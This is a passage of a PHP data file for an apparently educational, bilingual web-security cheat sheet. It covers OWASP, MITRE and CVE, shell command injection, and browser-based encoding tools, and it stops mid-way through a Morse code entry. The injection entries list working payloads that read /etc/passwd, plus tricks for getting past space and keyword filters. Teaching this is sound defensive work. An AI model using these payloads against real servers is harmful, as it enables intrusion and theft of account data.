<?php
$exploits_all=
array (
  'Acteurs-intro' => 
  array (
    'category' => 'Acteurs',
    'id' => 'intro',
    'title' => 'Acteurs',
    'desc' => '## Acteurs


',
    'title_en' => 'Actors',
    'desc_en' => '## Actors


',
  ),
  'Acteurs-owasp' => 
  array (
    'category' => 'Acteurs',
    'id' => 'owasp',
    'title' => 'OWASP',
    'desc' => '## OWASP

L\'Open Web Application Security Project (OWASP) est une communauté, fondée en 2001, qui produit et met gratuitement à disposition des articles, méthodologies, outils...<br/>
Elle publie tous les ans le Top 10 des failles de sécurités Web.<br/>
Elle publie l\'OWASP Testing Guide : un guide des best practices depentesting.<br/>
Elle publie l\'OWASP Development Guide: un guide visant à écrire du code sans failles de sécurité.<br/>
<a href=\'https://www.owasp.org\'>Site officiel: https://www.owasp.org</a>

',
    'title_en' => 'OWASP',
    'desc_en' => '## OWASP

The Open Web Application Security Project (OWASP) is a community, founded in 2001, which produces and makes available for free articles, methodologies, tools...<br/>
Every year, it publishes the Top 10 Web security vulnerabilities.
It publishes the OWASP Testing Guide: a guide to best practices in depentesting.<br/>
It publishes the OWASP Development Guide: a guide to writing code without security holes.
<a href=\'https://www.owasp.org\'>Official website: https://www.owasp.org</a>

',
  ),
  'Acteurs-mitre' => 
  array (
    'category' => 'Acteurs',
    'id' => 'mitre',
    'title' => 'MITRE Corporation',
    'desc' => '## MITRE Corporation

Mitre est l\'organisation, financée par la Défense des Etats unis, qui a mis en place et maintient le référencement des CVE:  Common Vulnerabilities and Exposures) <br/>
<a href=\'https://en.wikipedia.org/wiki/Mitre_Corporation\'>https://en.wikipedia.org/wiki/Mitre_Corporation</a>

',
    'title_en' => 'MITRE Corporation',
    'desc_en' => '## MITRE Corporation

Mitre is the organization, funded by the United States Defense Department, which has implemented and maintains the CVE referencing (Common Vulnerabilities and Exposures).
<a href=\'https://en.wikipedia.org/wiki/Mitre_Corporation\'>https://en.wikipedia.org/wiki/Mitre_Corporation</a>

',
  ),
  'Acteurs-cve' => 
  array (
    'category' => 'Acteurs',
    'id' => 'cve',
    'title' => 'CVE',
    'desc' => '## CVE

Une CVE, pour Common Vulnerabilities and Exposures, est une référence pour une faille de sécurité.<br/>
<a href=\'https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures\'>https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures</a>


',
    'title_en' => 'CVE',
    'desc_en' => '## CVE

A CVE, for Common Vulnerabilities and Exposures, is a reference for a security flaw.<br/>
<a href=\'https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures\'>https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures</a>


',
  ),
  'cmdinjection-intro' => 
  array (
    'category' => 'cmdinjection',
    'id' => 'intro',
    'title' => 'Injection de commandes Shell',
    'desc' => '## Injection de commandes Shell

L\'injection de commande Shell est possible quand un programme utilise une donnée, entrée par l\'utilisateur, sans la filtrer, comme argument d\'une commande shell.

Par exemple: un formulaire permet de saisir son nom et l\'afficher.
Le code coté serveur va ressembler à: system (\'echo \'.$NAME);
Si nous saisissons: YOLO; cat /etc/password;
Le serveur va enchainer les deux commandes en executant system (\'echo YOLO; cat /etc/password;\'); et nous permettre de récupérer le contenu du fichier passwd.

',
    'title_en' => 'Shell commands injection',
    'desc_en' => '## Shell commands injection

Shell command injection is possible when a program uses a data, entered by the user, without filtering it, as an argument of a shell command.

For example: a form allows to enter its name and display it.
The server-side code will look like: system (\'echo \'.$NAME);
If we enter: YOLO; cat /etc/password;
The server will chain the two commands by executing system (\'echo YOLO; cat /etc/password;\'); and allow us to retrieve the content of the passwd file.
',
  ),
  'cmdinjection-CommandPrinciple' => 
  array (
    'category' => 'cmdinjection',
    'id' => 'CommandPrinciple',
    'title' => 'Command Injection: Principe',
    'desc' => '## Command Injection: Principe

L\'injection de commande Shell est possible quand un programme utilise une donnée, entrée par l\'utilisateur, sans la filtrer, comme argument d\'une commande shell.

Par exemple: un formulaire permet de saisir son nom et l\'afficher.
Le code coté serveur va ressembler à:
```
system (\'echo \'.$NAME);
```

Si nous saisissons:
```
YOLO; cat /etc/password;
```

Le serveur va enchainer les deux commandes en executant:
```
system (\'echo YOLO; cat /etc/password;\');
```

Nous allons récupérer le contenu du fichier passwd.

Avec une injection de commande nous avons la main sur le serveur.
Nous pouvons récupérer des informations sur le serveur (uname -a), recupérer des noms de comptes (cat /etc/passwd), récupérer les fichiers de config du serveur web, lancer un reverse shell...

',
    'title_en' => 'Command Injection: Principle',
    'desc_en' => '## Command Injection: Principle

Shell command injection is possible when a program uses a data, entered by the user, without filtering it, as an argument of a shell command.

Example: You enter your name in a Web Form, your name is sent to the server then used in a shell command.
The server-side code looks like:
```
system (\'echo \'.$NAME);
```

Instead of just entering Yolo, you enter:
```
YOLO; cat /etc/password;
```

The server will chain the two commands by executing:
```
system (\'echo YOLO; cat /etc/password;\');
```

It is then possible to dump the content of the passwd file.

A command injection gives full control over the server.
One can retrieve informations about the server (uname -a), account names (cat /etc/passwd), web server config files, launch a reverse shell...

',
  ),
  'cmdinjection-CommandChainUx' => 
  array (
    'category' => 'cmdinjection',
    'id' => 'CommandChainUx',
    'title' => 'Unix: Enchainer deux commandes shell',
    'desc' => '## Unix: Enchainer deux commandes shell

Utiliser les séparateurs de commandes ; && | ||
```
echo YOLO; cat /etc/passwd
echo YOLO && cat /etc/passwd
echo YOLO | cat /etc/passwd
echo YOLO || cat /etc/passwd    Seulement si la première commande est en echec
```


',
    'title_en' => 'Unix: Chaining shell commands',
    'desc_en' => '## Unix: Chaining shell commands

Commands separators are : ; && | ||
```
echo YOLO; uname -a; cat /etc/passwd
echo YOLO && cat /etc/passwd
echo YOLO | cat /etc/passwd
echo YOLO || cat /etc/passwd    Only if the first cmd fail
```


',
  ),
  'cmdinjection-CommandEvalUx' => 
  array (
    'category' => 'cmdinjection',
    'id' => 'CommandEvalUx',
    'title' => 'Unix: Force command execution in a string',
    'desc' => '## Unix: Force command execution in a string

Il est possible de forcer l\'execution d\'une commande avec ` $ et {
```
echo `cat /etc/passwd`
echo $(cat /etc/passwd)
echo {cat,/etc/passwd}
```


',
    'title_en' => 'Unix: Force command execution in a string',
    'desc_en' => '## Unix: Force command execution in a string

To force command execution in a string let use ` $ or {
```
echo `cat /etc/passwd`
echo $(cat /etc/passwd)
echo {cat,/etc/passwd}
```


',
  ),
  'cmdinjection-CommandSpaceFilteres' => 
  array (
    'category' => 'cmdinjection',
    'id' => 'CommandSpaceFilteres',
    'title' => 'Bypass: Les espaces sont filtrés',
    'desc' => '## Bypass: Les espaces sont filtrés

Les développeurs peuvent avoir mis des filtres pour empécher l\'execution de commande. Par exemple retirer les espaces. Néanmoins, même sans espaces, il est toujours possible de lancer lancer des commandes:
```
cat&lt;/etc/passwd
{cat,/etc/passwd}
X=$\'cat\\x20/etc/passwd\'&&$X
```


',
    'title_en' => 'Bypass: Spaces are filtered',
    'desc_en' => '## Bypass: Spaces are filtered

Developpers sometimes add filters to avoid command injection. For exemple, they could filter Spaces.
Hopefully, even without spaces it\'s still possible to launch shell commands:
```
cat&lt;/etc/passwd
{cat,/etc/passwd}
X=$\'cat\\x20/etc/passwd\'&&$X
```


',
  ),
  'cmdinjection-CommandBlacklist' => 
  array (
    'category' => 'cmdinjection',
    'id' => 'CommandBlacklist',
    'title' => 'Bypass: Certains mot clefs sont filtrés',
    'desc' => '## Bypass: Certains mot clefs sont filtrés

Si un filtre recherche une liste de commandes, il est toujours possible de le contourner: simple quote, double quote, backslash et slash
```
c\'a\'t /etc/passwd
cat /etc/passwd
c\\at /etc/passwd
who``ami
```

Et si un nom de fichier est filtré, il est possible de multiplier les /
Filtre sur cat et /etc/passwd
```
c\\at /etc////////passwd
```



',
    'title_en' => 'Bypass: Some keywords are filtered',
    'desc_en' => '## Bypass: Some keywords are filtered

A keyword based filter is easy to bypass using simple quote, double quote, backslash and slash
```
c\'a\'t /etc/passwd
cat /etc/passwd
c\\at /etc/passwd
who``ami
```

In case the file \'/etc/passwd\' is filtered, just add /
```
c\\at /etc////////passwd
```



',
  ),
  'Encode-intro' => 
  array (
    'category' => 'Encode',
    'id' => 'intro',
    'title' => 'Encode',
    'desc' => '## Encode


',
    'title_en' => 'Encode',
    'desc_en' => '## Encode


',
  ),
  'Encode-EncodeHex' => 
  array (
    'category' => 'Encode',
    'id' => 'EncodeHex',
    'title' => 'Encodage hexadecimal',
    'desc' => '## Encodage hexadecimal

<br/>

<div class=\'\'>
<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Texte à encoder</label><br/>
<textarea id=\'hexEncodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onHexEncode()\' onChange=\'onHexEncode()\'></textarea>
<textarea readonly id=\'hexEncodeOut\' rows = \'5\' class=\'col-5\' name = \'description\' ></textarea>
</div>
<script>
function convertFromHex(hex) {
var hex = hex.toString();//force conversion
var str = \'\';
for (var i = 0; i < hex.length; i += 2)
str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
return str;
}

function convertToHex(str) {
var hex = \'\';
for(var i=0;i<str.length;i++) {
hex += \'\'+str.charCodeAt(i).toString(16);
}
return hex;
}
function onHexEncode(){
document.getElementById(\'hexEncodeOut\').value = convertToHex(document.getElementById(\'hexEncodeIn\').value);
}
</script>
</div>
<div class=\'\'>
<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Texte à décoder</label>
<textarea id=\'hexDecodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onHexDecode()\' onChange=\'onHexDecode()\'></textarea>
<textarea readonly id=\'hexDecodeOut\' rows = \'5\' class=\'col-5\'  name = \'description\'></textarea>
</div>
<script>
function onHexDecode(){
document.getElementById(\'hexDecodeOut\').value = convertFromHex(document.getElementById(\'hexDecodeIn\').value);
}
</script>
</div>



',
    'title_en' => 'Hexadecimal encode/decode',
    'desc_en' => '## Hexadecimal encode/decode


<div class=\'\'>
<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Texte à encoder</label><br/>
<textarea id=\'hexEncodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onHexEncode()\' onChange=\'onHexEncode()\'></textarea>
<textarea readonly id=\'hexEncodeOut\' rows = \'5\' class=\'col-5\' name = \'description\' ></textarea>
</div>
<script>
function convertFromHex(hex) {
var hex = hex.toString();//force conversion
var str = \'\';
for (var i = 0; i < hex.length; i += 2)
str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
return str;
}
function convertToHex(str) {
var hex = \'\';
for(var i=0;i<str.length;i++) {
hex += \'\'+str.charCodeAt(i).toString(16);
}
return hex;
}
function onHexEncode(){
document.getElementById(\'hexEncodeOut\').value = convertToHex(document.getElementById(\'hexEncodeIn\').value);
}
</script>
</div>
<div class=\'\'>
<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Texte à décoder</label>
<textarea id=\'hexDecodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onHexDecode()\' onChange=\'onHexDecode()\'></textarea>
<textarea readonly id=\'hexDecodeOut\' rows = \'5\' class=\'col-5\'  name = \'description\'></textarea>
</div>
<script>
function onHexDecode(){
document.getElementById(\'hexDecodeOut\').value = convertFromHex(document.getElementById(\'hexDecodeIn\').value);
}
</script>
</div>

',
  ),
  'Encode-HTTPBase64' => 
  array (
    'category' => 'Encode',
    'id' => 'HTTPBase64',
    'title' => 'Encodage base64',
    'desc' => '## Encodage base64

L\'encodage base64 permet de transmettre des données en n\'utilisant que des caractères affichables (lettres, chiffres, quelques signes...)<br/>

<div class=\'\'>
<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Texte à encoder</label><br/>
<textarea id=\'base64EncodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onBase64Encode()\' onChange=\'onBase64Encode()\'></textarea>
<textarea readonly id=\'base64EncodeOut\' rows = \'5\' class=\'col-5\' name = \'description\' ></textarea>
</div>
<script>
function onBase64Encode(){
document.getElementById(\'base64EncodeOut\').value = window.btoa(document.getElementById(\'base64EncodeIn\').value);
}
</script>
</div>
<div class=\'\'>
<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Texte à décoder</label>
<textarea id=\'base64DecodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onBase64Decode()\' onChange=\'onBase64Decode()\'></textarea>
<textarea readonly id=\'base64DecodeOut\' rows = \'5\' class=\'col-5\'  name = \'description\'></textarea>
</div>
<script>
function onBase64Decode(){
document.getElementById(\'base64DecodeOut\').value = window.atob(document.getElementById(\'base64DecodeIn\').value);
}
</script>
</div>



',
    'title_en' => 'Base64 encode/decode',
    'desc_en' => '## Base64 encode/decode

Base64 encoding is used to transmit data using only displayable characters (letters, numbers, a few signs, etc.)<br/>

<div class=\'\'>
<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Text to encode</label>
<textarea id=\'base64EncodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onBase64Encode()\' onChange=\'onBase64Encode()\'></textarea>
<textarea readonly id=\'base64EncodeOut\' rows = \'5\' class=\'col-5\' name = \'description\' ></textarea>
</div>
<script>
function onBase64Encode(){
document.getElementById(\'base64EncodeOut\').value = window.btoa(document.getElementById(\'base64EncodeIn\').value);
}
</script>
</div>
<div class=\'\'>

<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Text to decode</label>
<textarea id=\'base64DecodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onBase64Decode()\' onChange=\'onBase64Decode()\'></textarea>
<textarea readonly id=\'base64DecodeOut\' rows = \'5\' class=\'col-5\' name = \'description\'></textarea>
</div>

<script>
function onBase64Decode(){
document.getElementById(\'base64DecodeOut\').value = window.atob(document.getElementById(\'base64DecodeIn\').value);
}
</script>
</div>

',
  ),
  'Encode-EncodeURL' => 
  array (
    'category' => 'Encode',
    'id' => 'EncodeURL',
    'title' => 'Encodage URL/Pourcent',
    'desc' => '## Encodage URL/Pourcent

L\'encodage URL/Pourcent permet d\'utiliser des caractères spéciaux dans les urls tels que les apostrophes, les espaces...)<br/>

<div class=\'\'>
<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Text to encode</label>
<textarea id=\'UrlEncodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onUrlEncode()\' onChange=\'onUrlEncode()\'></textarea>
<textarea readonly id=\'UrlEncodeOut\' rows = \'5\' class=\'col-5\' name = \'description\' ></textarea>
</div>
<script>
function onUrlEncode(){
document.getElementById(\'UrlEncodeOut\').value = encodeURIComponent(document.getElementById(\'UrlEncodeIn\').value);
}
</script>
</div>
<div class=\'\'>

<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Text to decode</label>
<textarea id=\'UrlDecodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onUrlDecode()\' onChange=\'onUrlDecode()\'></textarea>
<textarea readonly id=\'UrlDecodeOut\' rows = \'5\' class=\'col-5\' name = \'description\'></textarea>
</div>

<script>
function onUrlDecode(){
document.getElementById(\'UrlDecodeOut\').value = decodeURIComponent(document.getElementById(\'UrlDecodeIn\').value);
}
</script>
</div>

',
    'title_en' => 'URL/Percent encode/decode',
    'desc_en' => '## URL/Percent encode/decode

URL/Percent encoding is used to transmit special characters in URL such as quote, spaces...)<br/>

<div class=\'\'>
<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Text to encode</label>
<textarea id=\'UrlEncodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onUrlEncode()\' onChange=\'onUrlEncode()\'></textarea>
<textarea readonly id=\'UrlEncodeOut\' rows = \'5\' class=\'col-5\' name = \'description\' ></textarea>
</div>
<script>
function onUrlEncode(){
document.getElementById(\'UrlEncodeOut\').value = encodeURIComponent(document.getElementById(\'UrlEncodeIn\').value);
}
</script>
</div>
<div class=\'\'>

<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Text to decode</label>
<textarea id=\'UrlDecodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onUrlDecode()\' onChange=\'onUrlDecode()\'></textarea>
<textarea readonly id=\'UrlDecodeOut\' rows = \'5\' class=\'col-5\' name = \'description\'></textarea>
</div>

<script>
function onUrlDecode(){
document.getElementById(\'UrlDecodeOut\').value = decodeURIComponent(document.getElementById(\'UrlDecodeIn\').value);
}
</script>
</div>

',
  ),
  'Encode-EncodeROT13' => 
  array (
    'category' => 'Encode',
    'id' => 'EncodeROT13',
    'title' => 'Encodage ROT13',
    'desc' => '## Encodage ROT13

<br/>

<div class=\'\'>
<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Text to encode</label>
<textarea id=\'Rot13EncodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onRot13Encode()\' onChange=\'onRot13Encode()\'></textarea>
<textarea readonly id=\'Rot13EncodeOut\' rows = \'5\' class=\'col-5\' name = \'description\' ></textarea>
</div>
<script>
function rot13(str) {
var input     = \'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\';
var output    = \'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm\';
var index     = x => input.indexOf(x);
var translate = x => index(x) > -1 ? output[index(x)] : x;
return str.split(\'\').map(translate).join(\'\');
}
function onRot13Encode(){
document.getElementById(\'Rot13EncodeOut\').value = rot13(document.getElementById(\'Rot13EncodeIn\').value);
}
</script>
</div>
<div class=\'\'>

<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Text to decode</label>
<textarea id=\'Rot13DecodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onRot13Decode()\' onChange=\'onRot13Decode()\'></textarea>
<textarea readonly id=\'Rot13DecodeOut\' rows = \'5\' class=\'col-5\' name = \'description\'></textarea>
</div>

<script>
function onRot13Decode(){
document.getElementById(\'Rot13DecodeOut\').value = rot13(document.getElementById(\'Rot13DecodeIn\').value);
}
</script>
</div>

',
    'title_en' => 'ROT13 encode/decode',
    'desc_en' => '## ROT13 encode/decode

<br/>

<div class=\'\'>
<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Text to encode</label>
<textarea id=\'Rot13EncodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onRot13Encode()\' onChange=\'onRot13Encode()\'></textarea>
<textarea readonly id=\'Rot13EncodeOut\' rows = \'5\' class=\'col-5\' name = \'description\' ></textarea>
</div>
<script>
function rot13(str) {
var input     = \'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\';
var output    = \'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm\';
var index     = x => input.indexOf(x);
var translate = x => index(x) > -1 ? output[index(x)] : x;
return str.split(\'\').map(translate).join(\'\');
}
function onRot13Encode(){
document.getElementById(\'Rot13EncodeOut\').value = rot13(document.getElementById(\'Rot13EncodeIn\').value);
}
</script>
</div>
<div class=\'\'>

<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Text to decode</label>
<textarea id=\'Rot13DecodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onRot13Decode()\' onChange=\'onRot13Decode()\'></textarea>
<textarea readonly id=\'Rot13DecodeOut\' rows = \'5\' class=\'col-5\' name = \'description\'></textarea>
</div>

<script>
function onRot13Decode(){
document.getElementById(\'Rot13DecodeOut\').value = rot13(document.getElementById(\'Rot13DecodeIn\').value);
}
</script>
</div>

',
  ),
  'Encode-EncodeCaesar' => 
  array (
    'category' => 'Encode',
    'id' => 'EncodeCaesar',
    'title' => 'Encodage Caesar',
    'desc' => '## Encodage Caesar

<br/>

<div class=\'\'>
<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Shift</label>
<textarea id=\'CaesarShift\' rows = \'1\' class=\'col-1\' name = \'description\' onKeyUp=\'onCaesarEncode();onCaesarDecode();\' onChange=\'onCaesarEncode();onCaesarDecode();\' >1</textarea>
<label  for=\'usr\' class=\'col-12\'>Text to encode</label>
<textarea id=\'CaesarEncodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onCaesarEncode()\' onChange=\'onCaesarEncode()\'></textarea>
<textarea readonly id=\'CaesarEncodeOut\' rows = \'5\' class=\'col-5\' name = \'description\' ></textarea>
</div>
<script>
var alphabet = \'abcdefghijklmnopqrstuvwxyz\';
var fullAlphabet = alphabet + alphabet + alphabet;

function CaesarEncode(cipherText, cipherOffset){
cipherOffset = (cipherOffset % alphabet.length);
var cipherFinish = \'\';

for(i=0; i<cipherText.length; i++){
var letter = cipherText[i];
var upper = (letter == letter.toUpperCase());
letter = letter.toLowerCase();

var index = alphabet.indexOf(letter);
if(index == -1){
cipherFinish += letter;
} else {
index = ((index + cipherOffset) + alphabet.length);
var nextLetter = fullAlphabet[index];
if(upper) nextLetter = nextLetter.toUpperCase();
cipherFinish += nextLetter;
}
}

return cipherFinish;
}

function onCaesarEncode(){
document.getElementById(\'CaesarEncodeOut\').value = CaesarEncode(document.getElementById(\'CaesarEncodeIn\').value, document.getElementById(\'CaesarShift\').value);
}
</script>
</div>
<div class=\'\'>

<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Text to decode</label>
<textarea id=\'CaesarDecodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onCaesarDecode()\' onChange=\'onCaesarDecode()\'></textarea>
<textarea readonly id=\'CaesarDecodeOut\' rows = \'5\' class=\'col-5\' name = \'description\'></textarea>
</div>

<script>
function onCaesarDecode(){
document.getElementById(\'CaesarDecodeOut\').value = CaesarEncode(document.getElementById(\'CaesarDecodeIn\').value, - document.getElementById(\'CaesarShift\').value);
}
</script>
</div>

',
    'title_en' => 'Caesar encode/decode',
    'desc_en' => '## Caesar encode/decode

<br/>

<div class=\'\'>
<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Shift</label>
<textarea id=\'CaesarShift\' rows = \'1\' class=\'col-1\' name = \'description\' onKeyUp=\'onCaesarEncode();onCaesarDecode();\' onChange=\'onCaesarEncode();onCaesarDecode();\'></textarea>
<label  for=\'usr\' class=\'col-12\'>Text to encode</label>
<textarea id=\'CaesarEncodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onCaesarEncode()\' onChange=\'onCaesarEncode()\'></textarea>
<textarea readonly id=\'CaesarEncodeOut\' rows = \'5\' class=\'col-5\' name = \'description\' ></textarea>
</div>
<script>
var alphabet = \'abcdefghijklmnopqrstuvwxyz\';
var fullAlphabet = alphabet + alphabet + alphabet;

function CaesarEncode(cipherText, cipherOffset){
cipherOffset = (cipherOffset % alphabet.length);
var cipherFinish = \'\';

for(i=0; i<cipherText.length; i++){
var letter = cipherText[i];
var upper = (letter == letter.toUpperCase());
letter = letter.toLowerCase();

var index = alphabet.indexOf(letter);
if(index == -1){
cipherFinish += letter;
} else {
index = ((index + cipherOffset) + alphabet.length);
var nextLetter = fullAlphabet[index];
if(upper) nextLetter = nextLetter.toUpperCase();
cipherFinish += nextLetter;
}
}

return cipherFinish;
}

function onCaesarEncode(){
document.getElementById(\'CaesarEncodeOut\').value = CaesarEncode(document.getElementById(\'CaesarEncodeIn\').value, document.getElementById(\'CaesarShift\').value);
}
</script>
</div>
<div class=\'\'>

<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Text to decode</label>
<textarea id=\'CaesarDecodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onCaesarDecode()\' onChange=\'onCaesarDecode()\'></textarea>
<textarea readonly id=\'CaesarDecodeOut\' rows = \'5\' class=\'col-5\' name = \'description\'></textarea>
</div>

<script>
function onCaesarDecode(){
document.getElementById(\'CaesarDecodeOut\').value = CaesarEncode(document.getElementById(\'CaesarDecodeIn\').value, - document.getElementById(\'CaesarShift\').value);
}
</script>
</div>

',
  ),
  'Encode-EncodeMorse' => 
  array (
    'category' => 'Encode',
    'id' => 'EncodeMorse',
    'title' => 'Code Morse',
    'desc' => '## Code Morse

<br/>
<div class=\'\'>
<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Text to encode</label>
<textarea id=\'MorseEncodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onMorseEncode()\' onChange=\'onMorseEncode()\'></textarea>
<textarea readonly id=\'MorseEncodeOut\' rows = \'5\' class=\'col-5\' name = \'description\' ></textarea>
</div>

<script>
var alphabet_morse = {
\'a\': \'.-\',    \'b\': \'-...\',  \'c\': \'-.-.\', \'d\': \'-..\',
\'e\': \'.\',     \'f\': \'..-.\',  \'g\': \'--.\',  \'h\': \'....\',
\'i\': \'..\',    \'j\': \'.---\',  \'k\': \'-.-\',  \'l\': \'.-..\',
\'m\': \'--\',    \'n\': \'-.\',    \'o\': \'---\',  \'p\': \'.--.\',
\'q\': \'--.-\',  \'r\': \'.-.\',   \'s\': \'...\',  \'t\': \'-\',
\'u\': \'..-\',   \'v\': \'...-\',  \'w\': \'.--\',  \'x\': \'-..-\',
\'y\': \'-.--\',  \'z\': \'--..\',
\' \': \'/\',     \'_\': \'..--.-\',
\'1\': \'.----\', \'2\': \'..---\', \'3\': \'...--\', \'4\': \'....-\',
\'5\': \'.....\', \'6\': \'-....\', \'7\': \'--...\', \'8\': \'---..\',
\'9\': \'----.\', \'0\': \'-----\',
};
function stringToMorse(txt) {
var morse = txt.split(\'\')            // Transform the string into an array: [\'T\', \'h\', \'i\', \'s\'...
.map(function(e){     // Replace each character with a morse letter
return alphabet_morse[e.toLowerCase()] || \'\'; // Lowercase only, ignore unknown characters.
})
.join(\' \')            // Convert the array back to a string.
/*.replace(/ +/g, \' \'); // Replace double spaces that may occur when unknow characters were in the source string.*/
return morse;
}
function onMorseEncode(){
document.getElementById(\'MorseEncodeOut\').value = stringToMorse(document.getElementById(\'MorseEncodeIn\').value);
}
</script>
</div>
<div class=\'\'>

<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Text to decode</label>
<textarea id=\'MorseDecodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onMorseDecode()\' onChange=\'onMorseDecode()\'></textarea>
<textarea readonly id=\'MorseDecodeOut\' rows = \'5\' class=\'col-5\' name = \'description\'></textarea>
</div>

<script>
var MORSE_CODE = {\'.-\': \'a\', \'-...\':\'b\', \'-.-.\': \'c\', \'-..\': \'d\', \'.\':\'e\', \'..-.\':\'f\', \'--.\':\'g\', \'....\':\'h\', \'..\':\'i\', \'.---\':\'j\', \'-.-\':\'k\', \'.-..\':\'l\', \'--\':\'m\', \'-.\':\'n\', \'---\':\'o\', \'.--.\':\'p\', \'--.-\':\'q\', \'.-.\':\'r\', \'...\':\'s\', \'-\':\'t\', \'..-\':\'u\', \'...-\':\'v\', \'.--\':\'w\', \'-..-\':\'x\', \'-.--\':\'y\', \'--..\':\'z\', \'.----\':\'1\', \'..---\':\'2\', \'...--\':\'3\', \'....-\':\'4\', \'.....\':\'5\', \'-....\':\'6\', \'--...\':\'7\', \'---..\':\'8\', \'----.\':\'9\', \'-----\':\'0\', \'|\':\' \', \'..--.-\':\'_\'};

var decodeMorse = function(morseCode){
var words = (morseCode).split(\'  \');
var letters = words.map((w) => w.split(\' \'));
var decoded = [];

for(var i = 0; i < letters.length; i++){
decoded[i] = [];
for(var x = 0; x < letters[i].length; x++){
if(MORSE_CODE[letters[i][x]]){
decoded[i].push( MORSE_CODE[letters[i][x]].toUpperCase() );
}
}
}

return decoded.map(arr => arr.join(\'\')).join(\' \');
}
function onMorseDecode(){
document.getElementById(\'MorseDecodeOut\').value = decodeMorse(document.getElementById(\'MorseDecodeIn\').value);
}
</script>
</div>
<div>
Veuillez noter que les majuscules sont perdues lors de l\'encodage.
</div>


',
    'title_en' => 'Morse Code',
    'desc_en' => '## Morse Code

<br/>

<div class=\'\'>
<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Text to encode</label>
<textarea id=\'MorseEncodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onMorseEncode()\' onChange=\'onMorseEncode()\'></textarea>
<textarea readonly id=\'MorseEncodeOut\' rows = \'5\' class=\'col-5\' name = \'description\' ></textarea>
</div>
<script>
var alphabet_morse = {
\'a\': \'.-\',    \'b\': \'-...\',  \'c\': \'-.-.\', \'d\': \'-..\',
\'e\': \'.\',     \'f\': \'..-.\',  \'g\': \'--.\',  \'h\': \'....\',
\'i\': \'..\',    \'j\': \'.---\',  \'k\': \'-.-\',  \'l\': \'.-..\',
\'m\': \'--\',    \'n\': \'-.\',    \'o\': \'---\',  \'p\': \'.--.\',
\'q\': \'--.-\',  \'r\': \'.-.\',   \'s\': \'...\',  \'t\': \'-\',
\'u\': \'..-\',   \'v\': \'...-\',  \'w\': \'.--\',  \'x\': \'-..-\',
\'y\': \'-.--\',  \'z\': \'--..\',
\' \': \'/\',     \'_\': \'..--.-\',
\'1\': \'.----\', \'2\': \'..---\', \'3\': \'...--\', \'4\': \'....-\',
\'5\': \'.....\', \'6\': \'-....\', \'7\': \'--...\', \'8\': \'---..\',
\'9\': \'----.\', \'0\': \'-----\',
};
function stringToMorse(txt) {
var morse = txt.split(\'\')            // Transform the string into an array: [\'T\', \'h\', \'i\', \'s\'...
.map(function(e){     // Replace each character with a morse letter
